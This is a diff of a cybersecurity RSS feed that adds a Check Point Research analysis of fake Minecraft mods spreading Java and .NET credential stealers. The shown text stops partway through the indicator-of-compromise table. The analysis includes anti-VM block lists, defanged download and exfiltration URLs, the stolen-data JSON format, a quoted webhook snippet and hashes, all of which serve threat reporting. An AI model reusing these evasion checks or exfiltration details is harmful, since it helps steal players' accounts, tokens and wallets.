@@ -1,5 +1,579 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 18 Jun 2025 12:59:25 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Don&amp;#x3f;t Make it Easier than it Already is&amp;#x3f;..Default Passwords &amp;#x5b;Guest Diary&amp;#x5d;</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Business Intelligence vs Data Analytics vs Artificial Intelligence: What Are the Differences?</title><link>https://www.techrepublic.com/article/differences-bi-ai-analytics/</link><description>Defining the differences often poses a challenge to many people. This guide will help your understanding.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=3978247</guid><category>Artificial Intelligence</category><category>Big Data</category><category>Data</category><category>ai</category><category>artificial intelligence</category><category>bi</category><category>business intelligence</category><category>data analysis</category><category>data analytics</category></item><item><title>Don&amp;#x3f;t Make it Easier than it Already is&amp;#x3f;..Default Passwords &amp;#x5b;Guest Diary&amp;#x5d;, (Wed, Jun 18th)</title><link>https://isc.sans.edu/diary/rss/32054</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by Matthew Paul, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by Matthew Paul, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 18 Jun 2025 13:59:19 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Don&amp;#x3f;t Make it Easier than it Already is&amp;#x3f;..Default Passwords &amp;#x5b;Guest Diary&amp;#x5d;</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Fake Minecraft mods distributed by the Stargazers Ghost Network to steal gamers’ data</title><link>https://research.checkpoint.com/2025/minecraft-mod-malware-stargazers/</link><description>&lt;p&gt;Research by:&amp;#160;Jaromír Hořejší (@JaromirHorejsi), Antonis Terefos (@Tera0017) Key Points Introduction Minecraft is a popular video game with a massive global player base, with over 200 million monthly active players. The game has also sold over 300 million copies, making it one of the best-selling video games ever. Minecraft supports mods (user-created modifications), which enrich the [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/minecraft-mod-malware-stargazers/"&gt;Fake Minecraft mods distributed by the Stargazers Ghost Network to steal gamers’ data&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Research by:&amp;nbsp;&lt;strong&gt;Jaromír Hořejší (&lt;a href="https://x.com/JaromirHorejsi"&gt;@JaromirHorejsi&lt;/a&gt;), Antonis Terefos (&lt;a href="https://x.com/Tera0017"&gt;@Tera0017&lt;/a&gt;)&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="key-points"&gt;Key Points&lt;/h2&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Check Point Research discovered a multistage campaign targeting Minecraft users via the distribution as a service (DaaS) Stargazers Ghost Network, which operates on GitHub. The malware impersonates, among others, Oringo and Taunahi, which are “Scripts &amp;amp; Macro” tools (a.k.a cheats).&lt;/li&gt;
+
+
+
+&lt;li&gt;The first-stage downloader and the second-stage stealer are implemented in Java and require Minecraft to be installed on the host. The third and last stage malware is a .NET stealer with extended capabilities.&lt;/li&gt;
+
+
+
+&lt;li&gt;Minecraft malware is written in Java, which is often overlooked by security solutions.&lt;/li&gt;
+
+
+
+&lt;li&gt;The malware is developed by a Russian-speaking threat actor and contains several artifacts written in the Russian language.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;
+
+
+
+&lt;p&gt;Minecraft is a popular video game with a massive global player base, with over 200 million monthly active players. The game has also sold over 300 million copies, making it one of the best-selling video games ever. Minecraft supports mods (user-created modifications), which enrich the user experience by improving gameplay, fixing bugs, enhancing graphics, and adding new content. It is estimated that more than 1 million players are actively involved in modding Minecraft.&lt;/p&gt;
+
+
+
+&lt;p&gt;Check Point Research discovered malicious repositories distributing malware via the&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/"&gt;Stargazers Ghost Network&lt;/a&gt;, which operates as a Distribution as a Service (DaaS).&lt;/p&gt;
+
+
+
+&lt;p&gt;The campaigns resulted in a multi-stage attack chain targeting Minecraft users specifically. The malware was impersonating Oringo and Taunahi, which are “Scripts and macros tools” (a.k.a. cheats). Both the first and second stages are developed in Java and can only be executed if the Minecraft runtime is installed on the host machine.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="stargazers-ghost-network-campaigns"&gt;Stargazers Ghost Network Campaigns&lt;/h2&gt;
+
+
+
+&lt;p&gt;Since March 2025, Check Point Research has been tracking malicious&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/stargazers-ghost-network/"&gt;GitHub repositories&lt;/a&gt;&amp;nbsp;targeting Minecraft users with an undetected Java downloader. Those repositories supposedly provided mods for Minecraft and appeared legitimate as multiple accounts starred those repositories.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-image"&gt;&lt;img alt="Figure 1: Malicious repositories." src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId28.png" /&gt;&lt;/figure&gt;
+
+
+
+&lt;p class="has-text-align-center"&gt;Figure 1: Malicious repositories.&lt;/p&gt;
+
+
+
+&lt;p&gt;The repositories contained various malicious jar files, and their names usually impersonated various cheat and automation tools. Below are listed the discovered filenames:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;FunnyMap-0.7.5.jar
+Oringo-1.8.9.jar
+Oringo-Client.1.8.9.jar
+Polar-1.8.9.jar
+PolarClient-v2.6.jar
+SkyblockExtras-1.8.9.jar
+Taunahi-V3.jar
+TaunahiPlus-V3.jar&lt;/pre&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 2: Malicious Release." src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId31.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2: Malicious Release.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This Java downloader is undetected by all antivirus engines across VirusTotal as it is highly targeted for Minecraft users, and the sandbox engines do not contain the required dependencies, which will let the malware run.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 3: VirusTotal detection." src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId34.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3: VirusTotal detection.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;While we have little information about the attacker, one thing is consistent regarding the attacker’s commits, all of them are made in the UTC+3 timezone, and Russian comments found on some malicious files further suggest the probable country of origin.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;--&gt; "tree 610486a827b9118c4443601c66524ba8036eb2bb\nparent 32c36b5892d2af4de4bd6c097814e56e672c5b21\nauthor P1geonD3v &amp;lt;MatildeKaitz46@outlook.com&gt; 1745610224 +0300\ncommitter GitHub &amp;lt;noreply@github.com&gt; 1745610224 +0300\n\nREADME.md"
+--&gt; "tree 4e17fb81ae629b923234147d500c27200ca48e3c\nparent 52f5bf7d2bc69fc89c3dedc85e2f7d7a0255aa9c\nauthor AlphaPigeonDev &amp;lt;MirandaDewan0884@outlook.com&gt; 1745613736 +0300\ncommitter GitHub &amp;lt;noreply@github.com&gt; 1745613736 +0300\n\nREADME.md"
+--&gt; "tree 9f1b30ca6551bd982e54c4a57e70ab372083fc05\nparent a6e206f07cd91f9a7a2b764808778dbcbae108ec\nauthor A1phaD3v &amp;lt;GoldenRokus995@outlook.com&gt; 1745615260 +0300\ncommitter GitHub &amp;lt;noreply@github.com&gt; 1745615260 +0300\n\nREADME.md"&lt;/pre&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="malware-overview"&gt;Malware overview&lt;/h2&gt;
+
+
+
+&lt;p&gt;The infection chain starts with a hosted JAR archive, which needs to be downloaded and installed manually by the victim as a Minecraft mod (”mod” is a shortcut for “modification”, which is a user-created addition or alteration of the original version. Mods can add new features, enhance game play and customize players’ experience.). When the victim starts the game, the malicious mod downloads the second-stage stealer, which in turn downloads one more .NET stealer. The malware is developed by a Russian-speaking threat actor and contains several artifacts written in the Russian language.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 4: Infection chain." src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId38.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4: Infection chain.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="part-i---static-analysis---1st-stage-loader"&gt;Part I &amp;#8211; Static Analysis &amp;#8211; 1st Stage Loader&lt;/h3&gt;
+
+
+
+&lt;p&gt;The initial JAR file is designed as a Minecraft Forge mod. It does not have the&amp;nbsp;&lt;a href="https://docs.oracle.com/javase/8/docs/api/java/util/jar/Attributes.Name.html#MAIN_CLASS"&gt;Main-Class&lt;/a&gt;&amp;nbsp;attribute in the manifest, thus, simply running “&lt;code&gt;java -jar &amp;lt;filename&amp;gt;&lt;/code&gt;” from the command line does not work. The package names of the first two stages are&amp;nbsp;&lt;code&gt;me.baikal.club&lt;/code&gt;, referencing Baikal, the deepest lake in the world, is located in the Asian part of Russia.&lt;/p&gt;
+
+
+
+&lt;p&gt;In order to develop custom mods, the developer must respect a certain structure and include specific dependencies. The main&amp;nbsp;&lt;code&gt;@Mod&lt;/code&gt;&amp;nbsp;class contains a reference to&amp;nbsp;&lt;code&gt;IFMLLoadingPlugin&lt;/code&gt;. FML letters stand for Forge Mod Loader.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 5: Loader imports classes from Minecraft Forge packages." src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId42.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5: Loader imports classes from Minecraft Forge packages.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Loader implements simple anti-VM and anti-analysis techniques. Initially, the loader gets the names of the three following properties (results are equivalent to calling&amp;nbsp;&lt;code&gt;“java -XshowSettings:properties -version”&lt;/code&gt;).&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;os.name&lt;/li&gt;
+
+
+
+&lt;li&gt;java.vm.name&lt;/li&gt;
+
+
+
+&lt;li&gt;java.vm.vendor&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;If any of the above-mentioned settings contain a block-listed keyword (related to various virtual machines), the malware (Minecraft mod) terminates itself. This is the list of block-listed keywords:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;vmware
+virtualbox
+kvm
+qemu
+hyperv
+xen
+parallels
+vbox
+vpc
+vboxguest
+sshd
+headd&lt;/pre&gt;
+
+
+
+&lt;p&gt;Then, the&amp;nbsp;&lt;code&gt;tasklist&lt;/code&gt;&amp;nbsp;utility is called to list all running processes. If any of the block-listed processes are detected, the mod’s execution is terminated. These processes are associated with virtual machines (VBox, Parallels, VMware), protocol analyzers (Wireshark, HTTP Debugger), and programs for listing network connections (TCPView).&lt;/p&gt;
+
+
+
+&lt;p&gt;This is the list of block-listed processes:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;VBoxTray.exe
+VBoxService.exe
+prl_cc.exe
+prl_tools.exe
+SharedIntApp.exe
+vmusrvc.exe
+vmsrvc.exe
+vmtoolsd.exe
+Wireshark.exe
+HTTPDebuggerUI.exe
+HTTPDebuggerSvc.exe
+tcpview.exe&lt;/pre&gt;
+
+
+
+&lt;p&gt;After passing the previous checks, the first stage downloads the content of a paste from Pastebin (&lt;code&gt;hxxps://pastebin.com/raw/xCa3vSiP&lt;/code&gt;). The base64 encoded content is decoded, and the malware retrieves a link (&lt;code&gt;hxxp://147.45.79.104/download&lt;/code&gt;) for the second stage. The downloader loads into memory the Java Stealer with the name&amp;nbsp;&lt;code&gt;MixinLoader-v2.4.jar&lt;/code&gt;.&lt;/p&gt;
+
+
+
+&lt;p&gt;Interestingly, the paste was created by username&amp;nbsp;&lt;code&gt;JoeBidenMama&lt;/code&gt;, who created three more pastes:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;Google statistics 3 (plaintext),&amp;nbsp;&lt;code&gt;hxxp://147.45.79[.]104/cookies&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;Google statistics 2 (Base64 Encoded),&amp;nbsp;&lt;code&gt;hxxp://147.45.79[.]104/download&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;Google statistics (plaintext),&amp;nbsp;&lt;code&gt;hxxp://147.45.79[.]104&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;Google statistics (plaintext),&amp;nbsp;&lt;code&gt;hxxp://147.45.79[.]104:80&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;Pastebin’s column “HITS” shows how many times the paste has been seen or downloaded. This can give us a rough estimate of an upper range of how many victims might have been targeted or infected, as the paste is accessed every time the infected plugin is run. Check Point Research kept monitoring this account and discovered further campaigns and paste-URLs being added, and a total number of hits exceeding&amp;nbsp;&lt;strong&gt;1500.&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 6: All pastes created by user &amp;lt;code&amp;gt;JoeBidenMama&amp;lt;/code&amp;gt; with
+statistics (HITS)" src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId45.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6: All pastes created by user&amp;nbsp;&lt;code&gt;JoeBidenMama&lt;/code&gt;&amp;nbsp;with statistics (HITS)&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="part-ii---dynamic-analysis---1st-stage-loader"&gt;Part II &amp;#8211; Dynamic Analysis &amp;#8211; 1st Stage Loader&lt;/h3&gt;
+
+
+
+&lt;p&gt;To add mods to a Minecraft game, the user must copy the malicious JAR archive into the Minecraft&amp;nbsp;&lt;strong&gt;mods&lt;/strong&gt;&amp;nbsp;folder. After starting the game, the Minecraft process will load all mods from the folder, including the malicious mod, which will download and execute the second stage.&lt;/p&gt;
+
+
+
+&lt;p&gt;To run the malware dynamically, we decided to install&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/a7c997ba3c3e91c048f80f96f08754948428f6d3fe4001bab79c4ae09d06c5e0"&gt;Legacy Launcher&lt;/a&gt;. The Minecraft Forge version 1.8.9 is required, as the metadata inside the&amp;nbsp;&lt;strong&gt;mcmod.info&lt;/strong&gt;&amp;nbsp;from the JAR archive reveals that our malicious plugin requires this loader.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 7: Content of mcmod.info file containing mod’s metadata" src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId50.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7: Content of mcmod.info file containing mod’s metadata&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Thus, all we need to do is run the Minecraft client and install the proper type and version of mod loader.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 8: Installing required mod loader" src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId53.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8: Installing required mod loader&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After the installation is complete, we can copy our malicious JAR file into the mods directory (&lt;code&gt;&amp;lt;installation_directory&amp;gt;\.tlauncher\legacy\Minecraft\game\mods\&lt;/code&gt;) and enter the game, which will activate our malicious mod.&lt;/p&gt;
+
+
+
+&lt;p&gt;Executing the malicious JAR plugin in a virtual machine, we can notice the execution of&amp;nbsp;&lt;code&gt;tasklist&lt;/code&gt;&amp;nbsp;just before the malicious plugin exits due to the detection of the virtual environment. For demonstration purposes, we edit the original JAR mod to execute&amp;nbsp;&lt;code&gt;notepad&lt;/code&gt;&amp;nbsp;instead of&amp;nbsp;&lt;code&gt;tasklist&lt;/code&gt;. Running such a modified mod executes Notepad, as shown in the animation below.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31549" height="650" src="https://research.checkpoint.com/wp-content/uploads/2025/06/rId56-1.gif" width="1160" /&gt;&lt;/figure&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 9: Running patched mod, notepad window appears when plugin loaded" src="https://research.checkpoint.com/s2_pandoc-html/media/rId56.gif" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="part-iii---2nd-stage-stealer"&gt;Part III &amp;#8211; 2nd Stage Stealer&lt;/h3&gt;
+
+
+
+&lt;p&gt;When the loader successfully passes all the environment checks, it loads the main component, the Stealer. Some samples may be obfuscated with&amp;nbsp;&lt;a href="https://skidfuscator.dev/"&gt;Skidfuscator&lt;/a&gt;. The interesting classes and functions of the stealer are shown in the listing below.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 10: List of classes and methods in the stealer" src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId61.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10: List of classes and methods in the stealer&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;Class Baikal&lt;/strong&gt;&amp;nbsp;&amp;#8211; a class that implements actions performed in the&amp;nbsp;&lt;a href="https://docs.minecraftforge.net/en/1.12.x/conventions/loadstages/"&gt;pre-initialization stage&lt;/a&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;method: init &amp;#8211; not implemented&lt;/p&gt;
+
+
+
+&lt;p&gt;method: preInit &amp;#8211; runs start() method from Start class&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Class Start&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;method: start&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;download and run .NET stealer&lt;/li&gt;
+
+
+
+&lt;li&gt;get external IP from checkip.amazonaws.com&lt;/li&gt;
+
+
+
+&lt;li&gt;steal
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Minecraft token&lt;/li&gt;
+
+
+
+&lt;li&gt;accounts.json file from Feather client/launcher&lt;/li&gt;
+
+
+
+&lt;li&gt;microsoft_accounts.jcon file from Essential client/launcher&lt;/li&gt;
+
+
+
+&lt;li&gt;accounts.json file from Lunar client/launcher&lt;/li&gt;
+
+
+
+&lt;li&gt;Discord token&lt;/li&gt;
+
+
+
+&lt;li&gt;Telegram&lt;/li&gt;
+
+
+
+&lt;li&gt;token from pizzaclient&lt;/li&gt;
+
+
+
+&lt;li&gt;username&lt;/li&gt;
+
+
+
+&lt;li&gt;playerID&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+
+
+
+&lt;li&gt;hardcoded type value is set to b0.5, which is likely a version of the stealer&lt;/li&gt;
+
+
+
+&lt;li&gt;GET exfiltration URL from Pastebin (hxxps://pastebin[.]com/raw/C9QvUqi3)&lt;/li&gt;
+
+
+
+&lt;li&gt;POST the stolen data in JSON format&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;{
+    "username": "%s",
+    "uuid": "%s",
+    "token": "%s",
+    "ip": "%s",
+    "feather": "%s",
+    "essentials": "%s",
+    "lunar": "%s",
+    "discord": "%s",
+    "type": "%s"
+}&lt;/pre&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Class SSHaccess&lt;/strong&gt;&amp;nbsp;&amp;#8211; class responsible for downloading and executing another file ( .NET stealer), which is analyzed in more detail in section IV.&lt;/p&gt;
+
+
+
+&lt;p&gt;method: downloadFile&lt;/p&gt;
+
+
+
+&lt;p&gt;method: runFile&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Class Discord&lt;/strong&gt;&amp;nbsp;&amp;#8211; class responsible for stealing Discord tokens. Lists files in&amp;nbsp;&lt;code&gt;%APPDATA%/discord/Local Storage/leveldb&lt;/code&gt;, reads the content of files with the extension&amp;nbsp;&lt;code&gt;.ldb&lt;/code&gt;, searches for tokens..&lt;/p&gt;
+
+
+
+&lt;p&gt;method: stealDiscord&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Class HTTP&lt;/strong&gt;&amp;nbsp;&amp;#8211; helper class implementing GET and POST requests&lt;/p&gt;
+
+
+
+&lt;p&gt;method: fetchURL &amp;#8211; GET request&lt;/p&gt;
+
+
+
+&lt;p&gt;method: post &amp;#8211; POST request&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Class Telegram&lt;/strong&gt;&amp;nbsp;&amp;#8211; class responsible for stealing Telegram data. Finds Telegram’s&amp;nbsp;&lt;code&gt;tdata&lt;/code&gt;&amp;nbsp;folder in, zips it, and exfiltrates it.&lt;/p&gt;
+
+
+
+&lt;p&gt;method: execute&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="part-iv---3rd-stage-.net-stealer"&gt;Part IV &amp;#8211; 3rd Stage .NET Stealer&lt;/h3&gt;
+
+
+
+&lt;p&gt;The SSHaccess class is responsible for downloading an additional stealer written in .NET and exfiltrating it to a Discord webhook. A webhook is a tool that allows external services or applications to send messages, notifications, or data to a specific Discord channel without needing a bot or user account to be logged in.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;[assembly: AssemblyTitle("44 CALIBER")]
+[assembly: AssemblyCopyright("FuckTheSystem Copyright ©  2021")]&lt;/pre&gt;
+
+
+
+&lt;p&gt;After deobfuscation we can observe that it steals various credentials from browsers (Chromium, Edge, Firefox), files (Desktop, Documents, %USERPROFILE%/Source), Cryptocurrency wallets (Armory, AtomicWallet, BitcoinCore, Bytecoin, DashCore, Electrum, Ethereum, LitecoinCore, Monero, Exodus, Zcash, Jaxx), VPNs (ProtonVPN, OpenVPN, NordVPN), Steam, Discord, FileZilla, Telegram, as well as collects information about the infected machine, such as running processes, external IP, content of clipboard, and takes a screenshot.&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 11: Snippet of stealer’s code with list of self-explanatory
+classes and methods they call" src="https://research.checkpoint.com/wp-content/uploads/2025/06/V8URAMTG6O-rId66.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11: Snippet of stealer’s code with list of self-explanatory classes and methods they call&lt;/figcaption&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;Stolen data are zipped, and together with following statistics, commented in Russian, uploaded to Discord webhook.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;"\n &amp;lt;@&amp;amp;945424667102031903&gt; fixed file size\n ",
+Environment.UserName,
+" ",
+SystemInfo.Country(),
+"\n -------------------------\n пассвордс: ",
+Counting.Passwords.ToString(),
+"\n -------------------------\n спиздил:",
+(Counting.Discord &gt; 0) ? "\n - дискорд" : "",
+(Counting.Wallets &gt; 0) ? "\n - холодки" : "",
+(Counting.Telegram &gt; 0) ? "\n - тг" : "",
+(Counting.Steam &gt; 0) ? "\n - стеме" : "",
+(Counting.NordVPN &gt; 0) ? "\n - нордвпн" : "",
+(Counting.OpenVPN &gt; 0) ? "\n - открытьвпн" : "",
+(Counting.ProtonVPN &gt; 0) ? "\n - протонвпн" : ""&lt;/pre&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;
+
+
+
+&lt;p&gt;A new Java-based malware downloader has remained largely undetected for an extended period. Disguised as Minecraft mods, these malicious Java archives often evade sandbox analysis due to missing dependencies. The Stargazers Ghost Network has been actively distributing this malware, targeting Minecraft players seeking mods to enhance their gameplay. What appeared to be harmless downloads were, in fact, Java-based loaders that deployed two additional stealers, capable of exfiltrating credentials and other sensitive data.&lt;/p&gt;
+
+
+
+&lt;p&gt;The threat actor behind these campaigns is likely of Russian origin. This case highlights how popular gaming communities can be exploited as effective vectors for malware distribution, emphasizing the importance of caution when downloading third-party content.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="protections"&gt;Protections&lt;/h2&gt;
+
+
+
+&lt;p&gt;Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, filetypes, and operating systems, and protect against the attacks and threats described in this report.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="indicators-of-compromise"&gt;Indicators of Compromise&lt;/h2&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;SHA256&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;stage 1 JAR&lt;/td&gt;&lt;td&gt;05b143fd7061bdd317bd42c373c5352bec351a44fa849ded58236013126d2963&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 1 JAR&lt;/td&gt;&lt;td&gt;9ca41431df9445535b96a45529fce9f9a8b7f26c08ac8989a57787462da3342f&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 1 JAR&lt;/td&gt;&lt;td&gt;c5936514e05e8b1327f0df393f4d311afd080e5467062151951e94bbd7519703&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 1 JAR&lt;/td&gt;&lt;td&gt;9a678140ce41bdd8c02065908ee85935e8d01e2530069df42856a1d6c902bae1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 JAR&lt;/td&gt;&lt;td&gt;4c8a6ad89c4218507e27ad6ef4ddadb6b507020c74691d02b986a252fb5dc612&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 JAR&lt;/td&gt;&lt;td&gt;51e423e8ab1eb49691d8500983f601989286f0552f444f342245197b74bc6fcf&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 JAR&lt;/td&gt;&lt;td&gt;5d80105913e42efe58f4c325ac9b7c89857cc67e1dcab9d99f865a28ef084b37&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 JAR&lt;/td&gt;&lt;td&gt;97df45c790994bbe7ac1a2cf83d42791c9d832fa21b99c867f5b329e0cc63f64&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 JAR&lt;/td&gt;&lt;td&gt;4c944b07832d5c29e7b499d9dd17a3d71f0fd918ab68694d110cbb8523b8af49&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 JAR&lt;/td&gt;&lt;td&gt;5590eaa4f11a6ed4351bc983e47d9dfd91245b89f3108bfd8b7f86e40d00b9fa&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 DL URL&lt;/td&gt;&lt;td&gt;hxxp[://]147[.]45[.]79[.]104/download&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 DL URL&lt;/td&gt;&lt;td&gt;hxxp://негры[.]рф/MixinLoader-v2.4[.]jar&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 2 UL URL&lt;/td&gt;&lt;td&gt;hxxp[://]185[.]95[.]159[.]125/upload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;hosting domain&lt;/td&gt;&lt;td&gt;негры[.]рф&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;stage 